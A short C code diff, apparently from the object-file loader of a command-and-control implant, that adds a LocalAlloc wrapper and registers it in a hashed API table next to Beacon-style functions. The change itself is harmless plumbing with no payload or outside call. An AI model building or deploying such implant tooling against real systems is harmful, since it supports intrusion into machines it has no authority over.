@@ -39,6 +39,11 @@ HLOCAL LdrLocalFree( PVOID hMem )
     return Instance->Win32.LocalFree( hMem );
 }
 
+HLOCAL LdrLocalAlloc( UINT uFlags, SIZE_T uBytes )
+{
+    return Instance->Win32.LocalAlloc( uFlags, uBytes );
+}
+
 COFFAPIFUNC BeaconApi[] = {
         { .NameHash = H_COFFAPI_BEACONDATAPARSER,             .Pointer = BeaconDataParse                  },
         { .NameHash = H_COFFAPI_BEACONDATAINT,                .Pointer = BeaconDataInt                    },
@@ -85,6 +90,7 @@ COFFAPIFUNC LdrApi[] = {
         { .NameHash = H_COFFAPI_GETPROCADDRESS,               .Pointer = LdrFunctionAddrString            },
         { .NameHash = H_COFFAPI_FREELIBRARY,                  .Pointer = LdrFreeLibrary                   },
         { .NameHash = H_COFFAPI_LOCALFREE,                    .Pointer = LdrLocalFree                     },
+        { .NameHash = H_COFFAPI_LOCALALLOC,                   .Pointer = LdrLocalAlloc                    },
 
         // End of array
         { .NameHash = 0, .Pointer = NULL },
